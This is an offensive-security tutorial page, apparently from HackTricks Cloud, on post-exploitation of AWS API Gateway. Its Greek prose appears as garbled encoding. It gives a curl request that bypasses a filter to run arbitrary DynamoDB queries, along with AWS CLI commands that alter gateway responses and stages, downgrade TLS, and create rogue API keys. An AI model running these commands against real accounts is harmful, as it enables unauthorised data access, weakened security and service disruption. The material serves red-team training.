# AWS - API Gateway Post Exploitation

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î¿ [**telegram group**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## API Gateway

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="../aws-services/aws-api-gateway-enum.md" %}
[aws-api-gateway-enum.md](../aws-services/aws-api-gateway-enum.md)
{% endcontent-ref %}

### Î ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¼Î· ÎµÎºÏ„ÎµÎ¸ÎµÎ¹Î¼Î­Î½Î± APIs

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± endpoint ÏƒÏ„Î¿ [https://us-east-1.console.aws.amazon.com/vpc/home#CreateVpcEndpoint](https://us-east-1.console.aws.amazon.com/vpc/home?region=us-east-1#CreateVpcEndpoint:) Î¼Îµ Ï„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î± `com.amazonaws.us-east-1.execute-api`, Î½Î± ÎµÎºÎ¸Î­ÏƒÎµÏ„Îµ Ï„Î¿ endpoint ÏƒÎµ Î­Î½Î± Î´Î¯ÎºÏ„Ï…Î¿ ÏŒÏ€Î¿Ï… Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· (Ï€Î¹Î¸Î±Î½ÏÏ‚ Î¼Î­ÏƒÏ‰ Î¼Î¹Î±Ï‚ Î¼Î·Ï‡Î±Î½Î®Ï‚ EC2) ÎºÎ±Î¹ Î½Î± Î±Î½Î±Î¸Î­ÏƒÎµÏ„Îµ Î¼Î¹Î± Î¿Î¼Î¬Î´Î± Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚.\
Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î±Ï€ÏŒ Ï„Î· Î¼Î·Ï‡Î±Î½Î® EC2 Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ endpoint ÎºÎ±Î¹ ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Î½Î± ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Ï„Î¿ gateway API Ï€Î¿Ï… Î´ÎµÎ½ ÎµÎ¯Ï‡Îµ ÎµÎºÏ„ÎµÎ¸ÎµÎ¯ Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚.

### Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Request body passthrough

Î‘Ï…Ï„Î® Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ® Î²ÏÎ­Î¸Î·ÎºÎµ ÏƒÎµ [**Î±Ï…Ï„Î® Ï„Î·Î½ Î±Î½Î±Ï†Î¿ÏÎ¬ CTF**](https://blog-tyage-net.translate.goog/post/2023/2023-09-03-midnightsun/?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=en&_x_tr_pto=wapp).

ÎŒÏ€Ï‰Ï‚ Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ [**Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ· AWS**](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-apigateway-method-integration.html) ÏƒÏ„Î·Î½ ÎµÎ½ÏŒÏ„Î·Ï„Î± `PassthroughBehavior`, Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Î· Ï„Î¹Î¼Î® **`WHEN_NO_MATCH`**, ÎºÎ±Ï„Î¬ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Ï„Î·Ï‚ ÎºÎµÏ†Î±Î»Î¯Î´Î±Ï‚ **Content-Type** Ï„Î¿Ï… Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚, Î¸Î± Ï€ÎµÏÎ¬ÏƒÎµÎ¹ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± ÏƒÏ„Î¿ backend Ï‡Ï‰ÏÎ¯Ï‚ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÎ¼ÏŒ.

Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, ÏƒÏ„Î¿ CTF Ï„Î¿ API Gateway ÎµÎ¯Ï‡Îµ Î­Î½Î± Ï€ÏÏŒÏ„Ï…Ï€Î¿ Î¿Î»Î¿ÎºÎ»Î®ÏÏ‰ÏƒÎ·Ï‚ Ï€Î¿Ï… **ÎµÎ¼Ï€ÏŒÎ´Î¹Î¶Îµ Ï„Î· ÏƒÎ·Î¼Î±Î¯Î± Î½Î± ÎµÎ¾Î±Ï‡Î¸ÎµÎ¯** ÏƒÎµ Î¼Î¹Î± Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· ÏŒÏ„Î±Î½ Î±Ï€Î¿ÏƒÏ„Î­Î»Î»ÎµÏ„Î±Î¹ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± Î¼Îµ `Content-Type: application/json`:

{% code overflow="wrap" %}
```yaml
RequestTemplates:
application/json: '{"TableName":"Movies","IndexName":"MovieName-Index","KeyConditionExpression":"moviename=:moviename","FilterExpression": "not contains(#description, :flagstring)","ExpressionAttributeNames": {"#description": "description"},"ExpressionAttributeValues":{":moviename":{"S":"$util.escapeJavaScript($input.params(''moviename''))"},":flagstring":{"S":"midnight"}}}'
```
{% endcode %}

Î©ÏƒÏ„ÏŒÏƒÎ¿, Î· Î±Ï€Î¿ÏƒÏ„Î¿Î»Î® ÎµÎ½ÏŒÏ‚ Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚ Î¼Îµ **`Content-type: text/json`** Î¸Î± ÎµÎ¼Ï€ÏŒÎ´Î¹Î¶Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï†Î¯Î»Ï„ÏÎ¿.

Î¤Î­Î»Î¿Ï‚, ÎºÎ±Î¸ÏÏ‚ Ï„Î¿ API Gateway ÎµÏ€Î­Ï„ÏÎµÏ€Îµ Î¼ÏŒÎ½Î¿ `Get` ÎºÎ±Î¹ `Options`, Î®Ï„Î±Î½ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± ÏƒÏ„Î±Î»ÎµÎ¯ Î­Î½Î± Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ ÎµÏÏÏ„Î·Î¼Î± dynamoDB Ï‡Ï‰ÏÎ¯Ï‚ ÎºÎ±Î½Î­Î½Î±Î½ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼ÏŒ ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Ï‚ Î­Î½Î± POST Î±Î¯Ï„Î·Î¼Î± Î¼Îµ Ï„Î¿ ÎµÏÏÏ„Î·Î¼Î± ÏƒÏ„Î¿ ÏƒÏÎ¼Î± ÎºÎ±Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ ÎºÎµÏ†Î±Î»Î¯Î´Î± `X-HTTP-Method-Override: GET`:

{% code overflow="wrap" %}
```bash
curl https://vu5bqggmfc.execute-api.eu-north-1.amazonaws.com/prod/movies/hackers -H 'X-HTTP-Method-Override: GET' -H 'Content-Type: text/json'  --data '{"TableName":"Movies","IndexName":"MovieName-Index","KeyConditionExpression":"moviename = :moviename","ExpressionAttributeValues":{":moviename":{"S":"hackers"}}}'
```
{% endcode %}

### Usage Plans DoS

Î£Ï„Î·Î½ ÎµÎ½ÏŒÏ„Î·Ï„Î± **Enumeration** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï€ÏÏ‚ Î½Î± **Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿ ÏƒÏ‡Î­Î´Î¹Î¿ Ï‡ÏÎ®ÏƒÎ·Ï‚** Ï„Ï‰Î½ ÎºÎ»ÎµÎ¹Î´Î¹ÏÎ½. Î•Î¬Î½ Î­Ï‡ÎµÏ„Îµ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ ÎºÎ±Î¹ ÎµÎ¯Î½Î±Î¹ **Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿** ÏƒÎµ X Ï‡ÏÎ®ÏƒÎµÎ¹Ï‚ **Î±Î½Î¬ Î¼Î®Î½Î±**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ **Î±Ï€Î»ÏÏ‚ Î½Î± Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ DoS**.

Î¤Î¿ **API Key** Ï€ÏÎ­Ï€ÎµÎ¹ Î±Ï€Î»ÏÏ‚ Î½Î± **ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î·Ï†Î¸ÎµÎ¯** Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± **HTTP header** Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ **`x-api-key`**.

### `apigateway:UpdateGatewayResponse`, `apigateway:CreateDeployment`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ `apigateway:UpdateGatewayResponse` ÎºÎ±Î¹ `apigateway:CreateDeployment` Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î¼Î¹Î± Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎ± Gateway Response Î³Î¹Î± Î½Î± ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î¬Î²ÎµÎ¹ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î± headers Î® Ï€ÏÏŒÏ„Ï…Ï€Î± Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·Ï‚ Ï€Î¿Ï… Î´Î¹Î±ÏÏÎ­Î¿Ï…Î½ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î® ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î± ÏƒÎµÎ½Î¬ÏÎ¹Î±**.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
RESPONSE_TYPE="DEFAULT_4XX"

# Update the Gateway Response
aws apigateway update-gateway-response --rest-api-id $API_ID --response-type $RESPONSE_TYPE --patch-operations op=replace,path=/responseTemplates/application~1json,value="{\"message\":\"$context.error.message\", \"malicious_header\":\"malicious_value\"}"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Î Î¹Î¸Î±Î½Î­Ï‚ Î•Ï€Î¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚**: Î”Î¹Î±ÏÏÎ¿Î® ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Ï‰Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½, ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Ï‰Î½ ÏƒÎµÎ½Î±ÏÎ¯Ï‰Î½ Î® Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Ï€ÏŒÏÎ¿Ï…Ï‚ API.

{% hint style="info" %}
Î‘Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î´Î¿ÎºÎ¹Î¼Î®
{% endhint %}

### `apigateway:UpdateStage`, `apigateway:CreateDeployment`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ `apigateway:UpdateStage` ÎºÎ±Î¹ `apigateway:CreateDeployment` Î¼Ï€Î¿ÏÎµÎ¯ **Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î¼Î¹Î± Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎ± ÏƒÎºÎ·Î½Î® API Gateway Î³Î¹Î± Î½Î± Î±Î½Î±ÎºÎ±Ï„ÎµÏ…Î¸ÏÎ½ÎµÎ¹ Ï„Î·Î½ ÎºÎ¯Î½Î·ÏƒÎ· ÏƒÎµ Î¼Î¹Î± Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ® ÏƒÎºÎ·Î½Î® Î® Î½Î± Î±Î»Î»Î¬Î¾ÎµÎ¹ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ caching Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±**.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
STAGE_NAME="Prod"

# Update the API Gateway stage
aws apigateway update-stage --rest-api-id $API_ID --stage-name $STAGE_NAME --patch-operations op=replace,path=/cacheClusterEnabled,value=true,op=replace,path=/cacheClusterSize,value="0.5"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Î Î¹Î¸Î±Î½Î­Ï‚ Î•Ï€Î¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚**: ÎœÎ· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±, Î´Î¹Î±ÎºÎ¿Ï€Î® Î® Ï€Î±ÏÎµÎ¼Î²Î¿Î»Î® ÏƒÏ„Î·Î½ ÎºÏ…ÎºÎ»Î¿Ï†Î¿ÏÎ¯Î± API.

{% hint style="info" %}
Î‘Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î´Î¿ÎºÎ¹Î¼Î®
{% endhint %}

### `apigateway:PutMethodResponse`, `apigateway:CreateDeployment`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ `apigateway:PutMethodResponse` ÎºÎ±Î¹ `apigateway:CreateDeployment` Î¼Ï€Î¿ÏÎµÎ¯ **Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î·Î½ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Î¼ÎµÎ¸ÏŒÎ´Î¿Ï… Î¼Î¹Î±Ï‚ Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎ±Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï… API Gateway REST API Î³Î¹Î± Î½Î± ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î¬Î²ÎµÎ¹ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î± headers Î® Ï€ÏÏŒÏ„Ï…Ï€Î± Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·Ï‚ Ï€Î¿Ï… Î´Î¹Î±ÏÏÎ­Î¿Ï…Î½ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î® ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î± ÏƒÎµÎ½Î¬ÏÎ¹Î±**.
```bash
API_ID="your-api-id"
RESOURCE_ID="your-resource-id"
HTTP_METHOD="GET"
STATUS_CODE="200"

# Update the method response
aws apigateway put-method-response --rest-api-id $API_ID --resource-id $RESOURCE_ID --http-method $HTTP_METHOD --status-code $STATUS_CODE --response-parameters "method.response.header.malicious_header=true"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Î Î¹Î¸Î±Î½Î­Ï‚ Î•Ï€Î¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚**: Î”Î¹Î±ÏÏÎ¿Î® ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Ï‰Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½, ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Ï‰Î½ ÏƒÎµÎ½Î±ÏÎ¯Ï‰Î½ Î® Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Ï€ÏŒÏÎ¿Ï…Ï‚ API.

{% hint style="info" %}
Î‘Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î´Î¿ÎºÎ¹Î¼Î®
{% endhint %}

### `apigateway:UpdateRestApi`, `apigateway:CreateDeployment`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ `apigateway:UpdateRestApi` ÎºÎ±Î¹ `apigateway:CreateDeployment` Î¼Ï€Î¿ÏÎµÎ¯ **Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… API Gateway REST API Î³Î¹Î± Î½Î± Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î·Î½ ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î® Î® Î½Î± Î±Î»Î»Î¬Î¾ÎµÎ¹ Ï„Î·Î½ ÎµÎ»Î¬Ï‡Î¹ÏƒÏ„Î· Î­ÎºÎ´Î¿ÏƒÎ· TLS, ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Î±Ï€Î¿Î´Ï…Î½Î±Î¼ÏÎ½Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î± Ï„Î¿Ï… API**.
```bash
API_ID="your-api-id"

# Update the REST API settings
aws apigateway update-rest-api --rest-api-id $API_ID --patch-operations op=replace,path=/minimumTlsVersion,value='TLS_1.0',op=replace,path=/apiKeySource,value='AUTHORIZER'

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Î Î¹Î¸Î±Î½Î­Ï‚ Î•Ï€Î¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚**: Î‘Î´Ï…Î½Î¬Ï„Î¹ÏƒÎ¼Î± Ï„Î·Ï‚ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ Ï„Î¿Ï… API, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î® Î­ÎºÎ¸ÎµÏƒÎ· ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Ï‰Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½.

{% hint style="info" %}
Î‘Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î´Î¿ÎºÎ¹Î¼Î®
{% endhint %}

### `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan`, `apigateway:CreateUsagePlanKey`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan`, ÎºÎ±Î¹ `apigateway:CreateUsagePlanKey` Î¼Ï€Î¿ÏÎµÎ¯ **Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î½Î­Î± API keys, Î½Î± Ï„Î± ÏƒÏ…ÏƒÏ‡ÎµÏ„Î¯ÏƒÎµÎ¹ Î¼Îµ ÏƒÏ‡Î­Î´Î¹Î± Ï‡ÏÎ®ÏƒÎ·Ï‚ ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î±Ï…Ï„Î¬ Ï„Î± ÎºÎ»ÎµÎ¹Î´Î¹Î¬ Î³Î¹Î± Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ APIs**.
```bash
# Create a new API key
API_KEY=$(aws apigateway create-api-key --enabled --output text --query 'id')

# Create a new usage plan
USAGE_PLAN=$(aws apigateway create-usage-plan --name "MaliciousUsagePlan" --output text --query 'id')

# Associate the API key with the usage plan
aws apigateway create-usage-plan-key --usage-plan-id $USAGE_PLAN --key-id $API_KEY --key-type API_KEY
```
**Î Î¹Î¸Î±Î½Î­Ï‚ Î•Ï€Î¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚**: ÎœÎ· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Ï€ÏŒÏÎ¿Ï…Ï‚ API, Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· ÎµÎ»Î­Î³Ï‡Ï‰Î½ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚.

{% hint style="info" %}
Î‘Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î´Î¿ÎºÎ¹Î¼Î®
{% endhint %}

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
